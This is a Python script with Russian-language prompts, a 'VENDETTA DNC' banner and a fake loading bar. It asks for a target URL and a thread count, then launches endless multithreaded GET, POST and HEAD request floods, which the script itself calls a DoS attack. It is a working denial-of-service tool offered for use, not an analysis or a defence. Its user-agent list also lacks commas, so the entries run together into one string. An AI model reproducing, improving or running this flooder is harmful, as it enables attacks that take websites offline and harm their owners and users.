import requests 
from threading import Thread
import random
import os

import time




from termcolor import colored
import time
import os
print("head...")
users = [
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
    "Mozilla / 5.0 (Macintosh; Intel Mac OS X 10.14; rv: 75.0) Gecko / 20100101 Firefox / 75.0"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
]
headers = {
    'User-Agent' : random.choice(users)
}
os.system("clear")
print("сейчас начнётся загрузка....")
time.sleep(2.5)
print(colored("█▒▒▒▒▒▒▒▒▒ > ПОДГОТОВКА УСТРОЙСТВА К ЗАПУСКУ УТИЛИТЫ",'red'))
print(colored("10%",'yellow'))
time.sleep(2.5)
print(colored("███▒▒▒▒▒▒▒ > ВЫЧИСЛЕНИЕ РАЗМЕРОВ...",'red'))
print(colored("30%", 'yellow'))
time.sleep(2.5)
print(colored("███████▒▒▒ > ПОЧТИ ГОТОВО...",'red'))
print(colored("50%", 'yellow'))
time.sleep(2.5)
print(colored("██████████ > ✔ ЗАПУСК УСПЕШНЫЙ ✔",'green' ))
print(colored("100%",'green' ))
time.sleep(2.5)



os.system("clear")
print(colored( '''
██╗░░░██╗███████╗███╗░░██╗██████╗░███████╗████████╗████████╗░█████╗░
██║░░░██║██╔════╝████╗░██║██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔══██╗
╚██╗░██╔╝█████╗░░██╔██╗██║██║░░██║█████╗░░░░░██║░░░░░░██║░░░███████║
░╚████╔╝░██╔══╝░░██║╚████║██║░░██║██╔══╝░░░░░██║░░░░░░██║░░░██╔══██║
░░╚██╔╝░░███████╗██║░╚███║██████╔╝███████╗░░░██║░░░░░░██║░░░██║░░██║
░░░╚═╝░░░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝


██████╗░███╗░░██╗░█████╗░
██╔══██╗████╗░██║██╔══██╗
██║░░██║██╔██╗██║██║░░╚═╝
██║░░██║██║╚████║██║░░██╗
██████╔╝██║░╚███║╚█████╔╝
╚═════╝░╚═╝░░╚══╝░╚════╝░

''','red'))


url = input(colored("ВВЕДИТЕ ССЫЛКУ ДЛЯ НАЧАЛА DoS АТАКИ>: ",'green' ))
threads = int(input(colored("УКАЖИТЕ КОЛИЧЕСТВО ПОТОКОВ (~800 лучше): ",'green' )))

payload = {
    'namest': 'username',
    'passwordst': 'password',
}
def send():
    while True:
        requests.get(url, headers=headers, data=payload)
        print(colored("Get...",'red' ))
        requests.post(url, headers=headers, data=payload)
        print(colored("post...",'red' ))
        requests.head(url, headers=headers, data=payload)
        print(colored("head...",'red' ))

if __name__ == '__main__':
    for i in range (threads):
        thr = Thread(target=send)
        thr.start()
